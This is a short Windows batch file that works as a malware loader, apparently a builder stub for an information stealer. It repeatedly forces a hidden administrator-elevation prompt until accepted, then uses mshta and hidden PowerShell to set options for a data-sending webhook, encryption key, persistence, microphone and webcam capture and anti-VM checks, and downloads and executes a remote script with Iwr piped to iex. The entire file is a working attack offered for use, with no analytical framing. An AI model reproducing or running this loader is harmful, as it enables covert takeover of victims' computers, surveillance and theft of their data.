@echo off
cd /d "%~dp0"
net session >nul 2>&1
if NOT %errorlevel% == 0 ( powershell -Win Hidden -NoP -ExecutionPolicy Bypass "while(1){try{Start-Process -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit )
mshta vbscript:close(createobject("wscript.shell").run("powershell $ProgressPreference = 'SilentlyContinue';$webhook = 'YOUR_URL_HERE_SERVER';$debug = $false;$vm_protect = $false;$encryption_key = 'YOUR_ENC_KEY_HERE';$blockhostsfile = $false;$criticalprocess = $false;$melt = $false;$fakeerror = $false;$persistence = $false;$write_disk_only = $false;$record_mic = $false;$webcam = $false;Iwr -Uri 'https://github.com/Pirate-Devs/Kematian/raw/main/frontend-src/main.ps1' -USeB | iex",0))
